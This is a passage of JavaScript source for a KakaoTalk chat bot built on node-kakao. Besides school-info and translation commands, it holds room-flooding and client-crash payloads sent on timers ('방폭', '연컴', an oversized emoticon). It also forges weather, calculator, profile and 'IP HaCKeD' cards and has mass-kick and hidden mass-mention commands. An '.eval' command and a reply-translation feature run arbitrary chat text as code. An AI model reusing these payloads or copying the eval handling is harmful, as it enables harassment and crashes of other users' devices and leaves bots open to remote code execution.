              "챈슬러 (15:04)",
              "http://dn-m.talk.kakao.com/talkm/oYhVZD3IJt/Exk5EjFWC7y2bzU0Q3qvX1/i_8yexxljrau0a1.jpg"
            );
            break;
          case 87:
            sendKV(
              chat,
              "던밀스 (15:40)",
              "http://dn-m.talk.kakao.com/talkm/oYhUzeq5ZV/UMug5frQdnyYN28WJbrsLk/i_4rtjexte83f5.jpg"
            );
            break;
          case 88:
            sendKV(
              chat,
              "한해 (14:25)",
              "http://dn-m.talk.kakao.com/talkm/oYhTg0olAR/nqzhBfBr7nIcGorbzN5yi1/i_0ly345k9xph51.jpg"
            );
            break;
          case 89:
            sendKV(
              chat,
              "기린 (17:28)",
              "http://dn-m.talk.kakao.com/talkm/oYhZOPJ0t1/2gzJfO9kUn79SNkSgY0X2k/i_sgavfjrbg7ks1.jpg"
            );
            break;
          case 90:
            sendKV(
              chat,
              "스컬 (14:20)",
              "http://dn-m.talk.kakao.com/talkm/oYhTv4fENw/nw26i0bKeKkRTexj6OsWlk/i_g8kbky0qb5gm1.jpg"
            );
            break;
          case 91:
            sendKV(
              chat,
              "QM (14:11)",
              "http://dn-m.talk.kakao.com/talkm/oYhUCWxhEL/3vR7cUKfK1J5oNLVLWUDK1/i_afqojispo5wb1.jpg"
            );
            break;
        }
      }
      if (Text == ".라이브톡") {
        client.ChannelManager.setLiveTalkCountMeta({
          liveon: "on",
          title: "root",
          startTime: 99999999,
          userId: 350694031,
        });
      }
      if (Text == ".나가기") {
        client.ChannelManager.leave(chat.channel);
      }
      if (Text == ".이미지가리기on") {
        imgbool = true;
        chat.replyText("[ ! ] 모든 이미지가 가려집니다");
      }
      if (Text == ".이미지가리기off") {
        imgbool = false;
        chat.replyText("[ ! ] 이미지가리기가 해제되었습니다");
      }
      if (chat.Text == "!Y") {
        kickYN.push("Y");
        chat.replyText('"Y" 응답이 기록되었습니다. 조금만 기다려주세요.');
      } else if (chat.Text == "!N") {
        kickYN.push("N");
        chat.replyText('"N" 응답이 기록되었습니다. 조금만 기다려주세요.');
      }
      if (chat.Text == ".입퇴장기록") {
        chat.replyText(
          "입퇴장기록" + "\u200b".repeat(500) + timeJoinLeftStamp.join("\n\n")
        );
      }
      if (Text.indexOf(".계산기조작") == 0) {
        var what = Text.split(" ");
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: `https://m.search.daum.net/kakao?w=tot&DA=SH1&rtmaxcoll=CC1&q=계산기`,
          Q: "계산기",
          V: "simple",
          R: [
            {
              D: what[1],
              L: "https://m.search.daum.net/kakao?w=tot&DA=SH1&rtmaxcoll=CC1&q=10+10",
              T: what[2],
            },
          ],
        });
      }
      if (Text == ".갠톡들" && mentionList.length > 0) {
        client.ChannelManager.inviteUserId(chat.channel, mentionList[0].UserId);
        channel.sendText("[ ! ] 갠톡으로 참여했습니다");
      }
      if (Text.startsWith(".소스 ") && chat.Type == 26 && isAdmin(userId)) {
        var q = Text.split(".소스 ")[1].split(" ")[0];
        var chlog = "";
        client.ChatManager.getChatListFrom(
          chat.channel.id,
          chat.attachmentList[0].SourceLogId
        ).then((r) => {
          if (r.result) {
            r.result.forEach((v, i) => {
              chlog +=
                "splitttt" +
                JSON.stringify(v.rawAttachment, null, 3) +
                "qpqpqpqpqpqpp" +
                node_kakao_1.ChatType[v.Type] +
                "padengli";
            });
            var k = chlog.split("splitttt")[1].split("qpqpqpqpqpqpp")[0];
            var e = chlog.split("qpqpqpqpqpqpp")[1].split("padengli")[0];
            chat.replyText(
              "소스" +
                "\u200b".repeat(500) +
                "\n\nif(Text=='!test'&& isAdmin(userId)){\nclient.chatManager.sendRaw(chat.channel," +
                q +
                ",'" +
                e +
                "'," +
                k +
                "\n)\n}"
            );
            chat.replyText(
              "eval" +
                "\u200b".repeat(500) +
                "\n\n\n.eval client.chatManager.sendRaw(chat.channel," +
                q +
                ",'" +
                e +
                "'," +
                k +
                "\n)"
            );
            fs.writeFile(
              "소스.txt",
              ".eval client.chatManager.sendRaw(chat.channel," +
                q +
                ",'" +
                e +
                "'," +
                k +
                "\n)",
              "utf8",
              function (err) {
                console.log("[ Save source ]");
              }
            );
          }
        }); //밑메 추출입니다
      } //!소스 (채팅타입 번호)
      if (Text == ".send") {
        chat.channel.sendMedia({
          type: node_kakao_1.ChatType.Text,
          data: fs.readFileSync("소스.txt"),
        });
      }
      function chunk(arr, size) {
        var i,
          j,
          temparray = [],
          chunk = size;
        for (i = 0, j = arr.length; i < j; i += chunk) {
          temparray.push(arr.slice(i, i + chunk));
        }
        return temparray;
      }

      if (chat.Text.startsWith("/학교")) {
        try {
          var coder = chat.Text.split("/학교/")[1].split("/")[0];
          var grades = chat.Text.substr(15).split("|")[0];
          var classs = chat.Text.split("|")[1];
          request(
            {
              uri:
                "http://193.123.246.37/api/isSurvey?org=" +
                coder +
                "&grade=" +
                grades +
                "&class=" +
                classs,
            },
            (e, r, bo) => {
              var bodys = bo.replace(
                /(\|[ ㅤ]*[0-9]{1,2}번[^\|(?! \|)]*[\|(?! \|)])/g,
                "\n$1"
              );
              chat.replyText("자가진단 현황" + "\u200b".repeat(1000) + bodys);
            }
          );
        } catch (e) {
          chat.replyText("오류입니다 다시 시도하세요.");
        }
      } // /학교/학교코드/학년|반
      function getMention(chat) {
        var zr = chat.getMentionContentList();
        if (!zr[0]) {
          return null;
        }
        return zr[0].UserId;
      }
      if (chat.Text.startsWith(".정보 ")) {
        var _Mention = getMention(chat);
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: chat.channel.getUserInfoId(String(_Mention)).memberStruct
            .originalProfileImageUrl,
          Q: chat.channel.getUserInfoId(String(_Mention)).memberStruct.nickname,
          V: "image",
          R: [
            {
              D: chat.channel.getUserInfoId(String(_Mention)).memberStruct
                .nickname,
              L: chat.channel.getUserInfoId(String(_Mention)).memberStruct
                .originalProfileImageUrl,
              I: chat.channel.getUserInfoId(String(_Mention)).memberStruct
                .originalProfileImageUrl,
              W: 10,
              H: 10,
            },
          ],
        });
      }
      if (chat.Text == ".보톡") {
        client.chatManager.sendRaw(chat.channel, 51, "보이스톡 해요", {
          type: "cinvite",
          csIP: "211.231.102.60",
          csIP6: "2404:4600:6:23e:211:231:102:60",
          csPort: 9000,
          callId: "95138542137123542",
          duration: 0,
        });
      }
      if (Type == node_kakao_1.ChatType.Reply) {
        let readers =
          chatReaders[channelId][String(chat.RawAttachment.src_logId)];
        if (Text == ".읽은사람") {
          if (chatReaders[channelId]) {
            if (!readers || readers.length == 0) {
              chat.replyText("[ ! ] 읽은 사람이 없습니다.");
            } else {
              var allsee = "\u200b".repeat(500);
              chat.replyText(
                `[ ! ] 읽은사람입니다.` + allsee + `\n\n${readers.join("\n")}`
              );
            }
          } else {
            chat.replyText("[!] 99명이 넘는 방이거나 읽은 사람이 없습니다.");
          }
        }
      }
      if (chat.Text.startsWith(".외치기 ")) {
        var a = chat.Text.substr(5);
        client.chatManager.sendRaw(chat.channel, 1, a, {
          shout: true,
        });
      }
      if (Text == ".끄기") {
        chat.replyText("[ ! ] 봇이 꺼집니다");
        process.exit();
      }
      if (Text == ".프로필") {
        client.chatManager.sendRaw(chat.channel, 17, "profile", {
          userId: 353986587,
        });
      }
      if (Text == ".방입장") {
        roomList.push(chat.Channel.Id);
        chat.replyText(
          "[ ! ] " +
            userInfo.Nickname +
            "님이 채팅에 참여했습니다!\n기본 규칙을 알고 싶으시면 .방규칙 을 입력해주세요"
        );
      }
      if (Text == ".방규칙") {
        chat.replyText(
          "[ ! ] 1. 욕설과 패드립 등은 봇에 해를 가할 수 있으니 삼가해주세요\n2. 채팅을 보내고 싶으시면 &(채팅) 형식으로 보내주세요"
        );
      }
      if (Text.startsWith("&")) {
        for (var i of roomList) {
          var channel = client.ChannelManager.get(i);
          channel.sendText(
            "[ ! ] " + userInfo.Nickname + ": " + Text.substring(1)
          );
        }
      }
      if (chat.Text.startsWith(".투명멘션")) {
        let allUser = Array.from(
          chat.channel.getUserInfoList().map((x) => x.user)
        );
        let mentions = [];
        allUser.forEach((user, index, _this) => {
          if (String(user.Id).length < 10) return;
          if (!mentions[Math.floor(index / 99)])
            mentions[Math.floor(index / 99)] = [];
          mentions[Math.floor(index / 99)].push({
            user_id: user.Id,
            at: [(index % 99) + 1],
            len: 1,
          });
        });
        mentions.forEach(async (mentions) => {
          let res = await client.chatManager.sendRaw(chat.channel, 25, "", {
            type: "",
            url: "",
            name: "(이모티콘)",
            width: "-1",
            height: "-1",
            sound: "",
            alt: "카카오 이모티콘",
            mentions: mentions,
          });
        });
      }
      if (Text.startsWith(".te")) {
        var a = Text.substr(4);
        chat.Channel;
      }
      if (Text.startsWith(".쪽지") && mentionList.length > 0) {
        var a = Text.split(" ")[1].split("/")[0];
        for (
          var j = 0;
          j <
          chat.channel.dataStruct.displayMemberList.map((x) => x.userId).length;
          j++
        ) {
          var i = chat.channel.dataStruct.displayMemberList.map(
            (x) => x.userId
          )[j];
          if (i == mentionList[0].userId) {
            jjokji +=
              '{"ID": `' +
              i.toString() +
              '`,"T": `From ' +
              userId.Nickname +
              '`,"DE": ""},';
          } else {
            jjokji +=
              '{ "ID": `' +
              i.toString() +
              '`,"T": `X`,"DE": `' +
              chat.Channel.getUserInfoId(mentionList[0].UserId).Nickname +
              "님에게만 보여지는 메세지입니다`},";
          }
        }
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: "https://m.search.daum.net/kakao?w=tot&DA=SH1&rtmaxcoll=ZEV&q=%EC%A0%9C%EB%B9%84%EB%BD%91%EA%B8%B0",
          Q: `TO.${chat.Channel.getUserInfoId(mentionList[0].UserId).Nickname}`,
          V: "opengame",
          R: [
            {
              D: "",
              L: "https://m.search.daum.net/kakao?w=tot&DA=SH1&rtmaxcoll=ZEV&q=%EC%A0%9C%EB%B9%84%EB%BD%91%EA%B8%B0&showresult=true",
              CV: {
                I: "https://search1.kakaocdn.net/sharp_search/kakao_balloon/bubble_img_game01_jebi_2.png",
                T: "내 결과를 확인하세요.",
              },
              TP: "2",
              DR: {
                T: "",
                DE: "",
              },
              RT: JSON.parse(jjokji.substr(0, str.length - 1)),
              MI: 0,
            },
          ],
          RF: {
            BU: [
              {
                L: "https://m.search.daum.net/kakao?w=tot&DA=SH1&rtmaxcoll=ZEV&q=%EC%A0%9C%EB%B9%84%EB%BD%91%EA%B8%B0",
                T: "전체 결과 확인하기",
              },
            ],
          },
        });
      }
      if (Text == ".방퇴장") {
        const idx = roomList.indexOf(chat.Channel.Id);
        if (idx > -1) roomList.splice(idx, 1);
        chat.replyText(
          "[ ! ] " + userInfo.Nickname + "님이 채팅에서 퇴장했습니다"
        );
      }
      if (Text.startsWith(".가르치기 ")) {
        if (
          Text.replace("//", "").includes("//") ||
          Text.substr(6).split("//")[1] === undefined
        )
          chat.replyText(
            "[ ! ] .가르치기 (학습할단어)//(반응할단어)로 입력해주세요."
          );
        else
          qu.push(Text.substr(6).split("//")[0]),
            (an[Text.substr(6).split("//")[0]] = []),
            an[Text.substr(6).split("//")[0]].push(
              Text.substr(6).split("//")[1]
            ),
            chat.replyText(
              '[ ! ] "' +
                Text.substr(6).split("//")[0] +
                '"(이)라고 말하면 "' +
                Text.substr(6).split("//")[1] +
                '"(이)라고 답합니다.'
            );
      }
      if (Text.startsWith(".가르치기삭제 ")) {
        if (qu.includes(Text.substr(8)))
          delete an[Text.substr(8)],
            qu.splice(qu.indexOf(Text.substr(8)), 1),
            chat.replyText(
              '[ ! ] "' + Text.substr(8) + '"의 가르치기를 삭제했습니다.'
            );
        else chat.replyText("[ ! ] 가르치기 목록에 없는 단어입니다.");
      }
      if (Text == ".가르치기모두삭제") {
        an = {};
        chat.replyText(
          "[ ! ] 가르치기 리스트 " + qu.length + "개를 모두 삭제합니다."
        );
      }
      if (Text == ".가르치기리스트") {
        for (key in an) {
          str += key + " - " + an[key] + "\n";
        }
        if (str == "") {
          chat.replyText("[ ! ] 아무것도 가르치지 않았습니다");
        } else {
          chat.replyText("[ ! ] 아무것도 가르치지 않았습니다");
        }
        str = "";
      }
      if (Text.indexOf(".날씨조작") == 0) {
        var i = Text.split(" ");
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: "링크",
          Q: i[1],
          V: "weather",
          P: "",
          R: [
            {
              D: `${i[1]}의 자세한 정보가 궁금하다면?`,
              L: "링크",
              P: "",
              PL: "카톡 수듄",
              TM: "04:44시 발표",
              MA: [
                {
                  IC: "28",
                  T: i[1],
                  TE: i[2],
                },
              ],
              SU: [
                {
                  IC: "31",
                  T: "10시",
                  TE: "102",
                  DE: "",
                },
                {
                  IC: "04",
                  T: "22시",
                  TE: "304",
                  DE: "",
                },
                {
                  IC: "31",
                  T: "03시",
                  TE: "486",
                  DE: "",
                },
                {
                  IC: "04",
                  T: "09시",
                  TE: "208",
                  DE: "",
                },
              ],
            },
          ],
        });
      }
      if (Text.startsWith(".시간표")) {
        var a = Text.split(" ");
        var name = a[1];
        var grade = parseInt(a[2]);
        var classs = parseInt(a[3]);
        var day = parseInt(a[4]);

        const test = async () => {
          await timetable.init();
          const school = await timetable.search(name);
          timetable.setSchool(school[0].code);

          // 전교 시간표 정보 조회
          const result = await timetable.getTimetable();
          var re = result[grade][classs][day];
          for (var i = 0; i < re.length; i++) {
            arrr.push(
              `${re[i].classTime}교시 과목: ${re[i].subject} / 담당 교사: ${re[i].teacher}`
            );
          }
          // 각 교시별 수업 시작/종료 시간 정보 조회
          const time = await timetable.getClassTime();
          chat.replyText(
            `[ ! ] 코드 ${
              school[0].code
            }의 시간표입니다.${allsee_1}\n${time.join("\n")}\n${arrr.join(
              "\n"
            )}`
          );
          arrr = [];
        };
        test();
      }
      if (Text.startsWith(".학교정보")) {
        var a = Text.split(" ");
        place = a[1];
        levell = a[2];
        namee = a[3];
        if (levell == "초등") {
          levell = School.Type.ELEMENTARY;
        }
        if (levell == "중등") {
          levell = School.Type.MIDDLE;
        }
        if (levell == "고등") {
          levell = School.Type.HIGH;
        }
        if (levell == "유치") {
          levell = School.Type.KINDERGARTEN;
        }
        if (place == "경기") {
          place = School.Region.GYEONGGI;
        }
        if (place == "인천") {
          place = School.Region.INCHEON;
        }
        if (place == "부산") {
          place = School.Region.BUSAN;
        }
        if (place == "광주") {
          place = School.Region.GWANGJU;
        }
        if (place == "대전") {
          place = School.Region.DAEJEON;
        }
        if (place == "대구") {
          place = School.Region.DAEGU;
        }
        if (place == "세종") {
          place = School.Region.SEJONG;
        }
        if (place == "울산") {
          place = School.Region.ULSAN;
        }
        if (place == "서울") {
          place = School.Region.SEOUL;
        }
        if (place == "강원") {
          place = School.Region.KANGWON;
        }
        if (place == "충북") {
          place = School.Region.CHUNGBUK;
        }
        if (place == "충남") {
          place = School.Region.CHUNGNAM;
        }
        if (place == "경북") {
          place = School.Region.GYEONGBUK;
        }
        if (place == "경남") {
          place = School.Region.GYEONGNAM;
        }
        if (place == "전북") {
          place = School.Region.JEONBUK;
        }
        if (place == "전남") {
          place = School.Region.JEONNAM;
        }
        if (place == "제주") {
          place = School.Region.JEJU;
        }
        try {
          const example = async function () {
            const result = await sch.search(place, namee);
            sch.init(levell, School.Region.GYEONGGI, result[0].schoolCode);
            const meal = await sch.getMeal();
            const calendar = await sch.getCalendar();
            for (key in calendar) {
              if (calendar[key] == "") {
                continue;
              } else {
                nothing.push(key + ": " + calendar[key]);
              }
            }
            if (meal.today == "") {
              today_meal = "급식이 없습니다";
            } else {
              today_meal = meal.today;
            }
            if (result[0].address) {
              placeee = "주소가 설정되어있지 않습니다";
            } else {
              placeee = result[0].address;
            }
            chat.replyText(
              `[ ! ] ${result[0].name}의 정보입니다${allsee_1}\nNEIS 코드: ${
                result[0].schoolCode
              }\n학교명: ${
                result[0].name
              }\n주소: ${placeee}\n급식: ${today_meal}\n학사 일정: \n${nothing.join(
                "\n"
              )}`
            );
            nothing = [];
          };
          example();
        } catch {
          chat.replyText("[ ! ] 학교를 찾을 수 없습니다");
        }
      }
      if (Text.indexOf(".프로필조작") == 0) {
        var whatthe = Text.split(" ");
        client.chatManager.sendRaw(chat.channel, 17, "profile", {
          userId: whatthe[1],
          nickName: whatthe[2],
        });
      }
      if (Text.indexOf(".실프") == 0) {
        client.chatManager.sendRaw(chat.channel, 17, "Profile", {
          userId: parseInt(parseInt(Text.substr(4)).toString(2).substr(27), 2),
        });
      }
      if (Text.indexOf(".연락처조작") == 0) {
        var whatthe = Text.split(" ");
        client.chatManager.sendRaw(chat.channel, 4, "Unknown", {
          name: whatthe[1],
        });
      }
      if (Text.startsWith(".강퇴 ") && mentionList.length > 0) {
        client.OpenLinkManager.kickMember(chat.channel, mentionList[0].UserId);
        chat.replyText("[ ! ] kick_1 완료하였습니다");
      }
      var userType = chat.Channel.isOpenChat();
      if (Text == ".유저타입") {
        chat.replyText(String(chat.Sender.userType));
      }
      if (Text.startsWith(".id ") && mentionList.length > 0) {
        chat.replyText(String(mentionList[0].UserId));
      }
      if (Text.startsWith(".채팅금지 ") && mentionList.length > 0) {
        if (!noChatUsers.includes(String(mentionList[0].UserId))) {
          noChatUsers.push(String(mentionList[0].UserId));
          chat.replyText("[ ! ] 해당 유저를 채팅금지 시켰습니다.");
        } else {
          chat.replyText("[ ! ] 해당 유저는 이미 채팅금지 상태입니다.");
        }
      }
      if (Text.startsWith(".채금해제 ") && mentionList.length > 0) {
        if (noChatUsers.includes(String(mentionList[0].UserId))) {
          noChatUsers.splice(
            noChatUsers.indexOf(String(mentionList[0].UserId)),
            1
          );
          chat.replyText("[ ! ] 해당 유저를 채팅금지 해제했습니다.");
        } else {
          chat.replyText("채팅금지상태인 유저가 아닙니다.");
        }
      }

      if (Text.startsWith(".감지 ") && mentionList.length > 0) {
        if (!detectingUsers.includes(String(mentionList[0].UserId))) {
          detectingUsers.push(String(mentionList[0].UserId));
          chat.replyText("[ ! ] 해당 유저를 감지합니다.");
        } else {
          chat.replyText("[ ! ] 해당 유저는 이미 감지중입니다.");
        }
      }
      if (
        Text == ".모두강퇴" &&
        isAdmin(userId) &&
        (userInfo.MemberType == 1 || userInfo.MemberType == 4)
      ) {
        delayKick(openChannel);
      }

      if (Text == ".도배" && !runningSpam) {
        runningSpam = true;
        spamInterval = setInterval(() => {
          chat.replyText(
            "ทา.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวยังค.นข้.วแวย"
          );
        }, 210);
      }
      if (Text == ".폰방폭" && !runnings) {
        runnings = true;
        spamIn = setInterval(() => {
          client.chatManager.sendRaw(chat.channel, 98, "Unknown", {
            os: [
              {
                t: 5,
                url: [
                  "http://kinimage.naver.net/20170125_112/148530977212743dlX_JPEG/f.jpg?type=w620",
                ],
              },
            ],
          });
        }, 170);
      }
      if (Text == ".폰방폭중지" && runnings) {
        clearInterval(spamIn);
        spamIn = null;
        runnings = false;
      }
      if (Text == ".연컴" && !runnin) {
        runnin = true;
        spamInterv = setInterval(() => {
          client.chatManager.sendRaw(chat.channel, 23, "Search", {
            R: [
              {
                L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
                MA: [],
                D: "PC 펑",
                PL: "펑",
                TM: "튕",
                SU: [
                  {
                    TE: "44",
                    T: ".",
                    IC: "44",
                    DE: "",
                  },
                ],
              },
            ],
            V: "weather",
            callingPkg: "",
            L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
            Q: "전국 오늘 날씨",
          });
        }, 3000);
      }
      if (Text == ".종합방폭 중지" && runn) {
        clearInterval(spamInter);
        spamInter = null;
        runn = false;
      }
      if (Text == ".종합방폭" && !runn) {
        runn = true;
        spamInter = setInterval(() => {
          client.chatManager.sendRaw(chat.channel, 98, "Unknown", bangpok);
          pausecomp(2000);
          client.chatManager.sendRaw(chat.channel, 98, "Unknown", bangpok);
          pausecomp(2000);
          client.chatManager.sendRaw(chat.channel, 23, "Search", {
            R: [
              {
                L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
                MA: [],
                D: "PC 펑",
                PL: "펑",
                TM: "튕",
                SU: [
                  {
                    TE: "44",
                    T: ".",
                    IC: "44",
                    DE: "",
                  },
                ],
              },
            ],
            V: "weather",
            callingPkg: "",
            L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
            Q: "전국 오늘 날씨",
          });
          pausecomp(3000);
          client.chatManager.sendRaw(chat.channel, 98, "Unknown", {
            os: [
              {
                t: 5,
                url: [
                  "http://kinimage.naver.net/20170125_112/148530977212743dlX_JPEG/f.jpg?type=w620",
                ],
              },
            ],
          });
          pausecomp(5000);
        });
      }

      if (Text.startsWith(".봇 ") && mentionList.length > 0) {
        client.OpenLinkManager.setOpenMemberType(
          chat.Channel,
          mentionList[0].UserId,
          OpenMemberType.BOT
        );
        chat.replyText("[ ! ] 해당 유저의 권한을 봇으로 변환합니다.");
      }
      if(Text=='.청소') {
        client.chatManager.sendRaw(chat.channel, 25, "", {
          name: "(이모티콘)",
          path: "4412207.emot_002.webp",
          type: "image/webp",
          width: 99999,
          height: 99999,
          xconVersion: 1,
          s: 0,
          alt: "카카오 이모티콘",
        });
      }
      if (Text.startsWith(".ip")) {
        var linkk2 = Text.substr(4);
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: linkk2,
          Q: "IP HaCKeD",
          V: "image",
          R: [
            {
              D: "IP HaCKeD",
              L: linkk2,
              I: linkk2,
              W: 800,
              H: 800,
            },
          ],
        });
      }
      if (Text.startsWith(".방장넘기기 ") && mentionList.length > 0) {
        client.OpenLinkManager.handOverHost(
          chat.Channel,
          mentionList[0].UserId
        );
        chat.replyText(
          "[ ! ] 해당 유저를 새 방장으로 선정하였습니다. 모두 축하해주세요!"
        );
      }
      if (Text.startsWith(".큐알 ") && isAdmin(userId)) {
        var k = Text.substr(4).trim();
        var t =
          "https://chart.apis.google.com/chart?cht=qr&chs=526x526&chl=" + k;
        sendRandom(chat, "QR코드: " + k, t);
      } //!큐알 (텍스트)
      function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min)) + min; //최댓값은 제외, 최솟값은 포함
      }
      if (Text == ".uuid") {
        var a = getRandomInt(10, 100);
        var key_1 = require("node-kakao").TestUtil.randomDeviceUUID();
        chat.replyText(key_1);
      }
      const uniqueArr = adminList.filter((element, index) => {
        return adminList.indexOf(element) === index;
      });
      if (Text.indexOf(".어드민") == 0 && mentionList.length > 0) {
        if (adminList.includes(String(mentionList[0].UserId))) {
          chat.replyText("[ ! ] 이미 어드민입니다");
        } else {
          chat.replyText("[ ! ] 완료");
          adminList.push(String(mentionList[0].UserId));
        }
      }
      if (Text.indexOf(".어드민해제") == 0 && mentionList.length > 0) {
        if (adminList.includes(String(mentionList[0].UserId))) {
          const idx_a = adminList.indexOf(String(mentionList[0].UserId));
          if (idx_a > -1) adminList.splice(idx_a, 1);
          chat.replyText("[ ! ] 완료");
        } else {
          chat.replyText("[ ! ] 어드민이 아닙니다");
        }
      }

      if (Text == ".2id") {
        chat.replyText(chat.Reply.SourceUserId.toString());
      }
      if (Text.indexOf(".강퇴해제") == 0) {
        try {
          client.OpenLinkManager.deleteFromKickList(chat.channel, 1);
          chat.replyText("[ ! ] 강퇴를 해제하였습니다!");
        } catch {
          chat.replyText("[ ! ] 강퇴 목록에 있지 않습니다!");
        }
      }
      if (Type == node_kakao_1.ChatType.Reply) {
        if (Text == ".번역") {
          var a = eval(chat.RawAttachment.src_message);
          translate(a, { to: "ko" })
            .then((res) => {
              chat.replyText(res.text); // OUTPUT: You are amazing!
            })
            .catch((err) => {
              chat.replyText(err);
            });
        }
      }
      if (Text == ".어드민리스트") {
        var a = [];
        for (var value of adminList) {
          // 위와 같은 동작을 하는 for / of 문
          a.push(chat.Channel.getUserInfoId(value).Nickname);
        }
        chat.replyText(a.join("/"));
      }
      if (chat.Text.startsWith(".2임티")) {
        var sw1 = chat.Text;
        var sw1Change = sw1.split(" ");
        var sw1a = sw1Change[1];
        var sw1b = sw1Change[2];
        var sw1c = sw1Change[3];
        var sw1d = sw1Change[4];
        var sw1e = sw1Change[5];

        client.chatManager.sendRaw(chat.channel, 20, "", {
          name: "(이모티콘)",
          url: sw1a + ".emot_" + sw1b + ".webp",
          type: "image/webp",
          sound: sw1c + ".sound_" + sw1d + ".mp3",
          s: 0,
        });
      }
      if (Text.startsWith(".부방 ") && mentionList.length > 0) {
        client.OpenLinkManager.setOpenMemberType(
          chat.Channel,
          mentionList[0].UserId,
          OpenMemberType.MANAGER
        );
        chat.replyText("[ ! ] 해당 유저의 권한을 부방장으로 변환합니다.");
      }
      if (Text.startsWith(".초기화 ") && mentionList.length > 0) {
        client.OpenLinkManager.setOpenMemberType(
          chat.Channel,
          mentionList[0].UserId,
          OpenMemberType.NONE
        );
        chat.replyText("[ ! ] 해당 유저의 권한을 초기화하였습니다.");
      }
      function pausecomp(millis) {
        var date = new Date();
        var curDate = null;
        do {
          curDate = new Date();
        } while (curDate - date < millis);
      }
      if (Text.startsWith(".임티 ")) {
        var c = Text.split(" ");
        if (c[3] == undefined) {
          client.chatManager.sendRaw(chat.channel, 25, "", {
            name: "(이모티콘)",
            path: c[1] + ".emot_" + c[2] + ".webp",
            type: "image/webp",
            width: 300,
            height: 300,
            xconVersion: 1,
            s: 0,
            alt: "카카오 이모티콘",
          });
        } else {
          client.chatManager.sendRaw(chat.channel, 25, "", {
            name: "(이모티콘)",
            path: c[1] + ".emot_" + c[2] + ".webp",
            type: "image/webp",
            width: c[3],
            height: c[3],
            xconVersion: 1,
            s: 0,
            alt: "카카오 이모티콘",
          });
        }
      }
      if (Text == ".비상모드") {
        emergency = true;
        chat.replyText("[ ! ] 비상 모드가 활성화되었습니다");
      }
      if (Text == ".도배중지" && runningSpam) {
        clearInterval(spamInterval);
        spamInterval = null;
        runningSpam = false;
      }
      if (Text == ".연컴중지" && runnin) {
        clearInterval(spamInterv);
        spamInterv = null;
        runnin = false;
      }
      if (Text == ".가리기") {
        chat.Channel.hideChatId(chat.Reply.SourceLogId);
      }
      if (Text == ".블랙리스트") {
        blacklist.push(chat.attachmentList[0].SourceUserId);
        chat.replyText("[ ! ] 해당 유저가 블랙리스트에 추가되었습니다");
      }
      if (Text == ".블랙리스트 초기화") {
        blacklist.length = 0;
        chat.replyText("[ ! ] 블랙리스트가 초기화 되었습니다");
      }
      if (Text == ".모두멘션") {
        var allsee = "\u200b".repeat(500);
        var a = chunk(chat.Channel.getUserInfoList(), 15);
        for (var i = 0; i < a.length; i++) {
          chat.replyText(
            allsee,
            ...a[i].map((x) => new node_kakao_1.ChatMention(x))
          );
          pausecomp(500);
        }
      }
      if (Text.indexOf(".eval ") == 0) {
        var value = String(Text.substring(6));
        try {
          chat.replyText(String(eval(value)));
        } catch (err) {
          chat.replyText(String(err));
        }
      }
      if (Text == ".한강물") {
        var s =
          "https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=https://hangang.life/";
        sendRandom(chat, "현재 한강물 온도", s);
      }
      if (Text.startsWith(".캡쳐 ") && isAdmin(userId)) {
        var q = Text.substr(4).trim();
        var s =
          "https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=" +
          q;
        sendRandom(chat, "캡쳐", s);
      } //캡쳐 (사이트 URL)
      function sendRandom(chat, name, link) {
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: link,
          Q: name,
          V: "image",
          R: [{ D: name, L: link, I: link, W: 800, H: 800 }],
        });
      }
      if (chat.Text.startsWith(".2강퇴")) {
        client.OpenLinkManager.kickMember(
          chat.channel,
          chat.attachmentList[0].SourceUserId
        );
        chat.Channel.hideChatId(chat.Reply.SourceLogId);
        chat.replyText("[ ! ] kick_2 완료했습니다!");
      }
      if (chat.Text == ".성인랭킹") {
        client.chatManager.sendRaw(chat.channel, 9, "성인랭킹", {
          P: {
            ME: "카카오톡 봇",
            LOCK: false,
            AD: false,
            DID: "/bot/5fb551c2d9431d64aa843571/intent/5fb6a0bd2cb6e55d5b67dd06",
            VW: "2.6.1",
            FW: false,
            TP: "Carousel",
            VM: "2.3.5",
            SID: "plusfriend_bot",
            VI: "6.4.5",
            VA: "6.4.5",
            A: {
              version: 1,
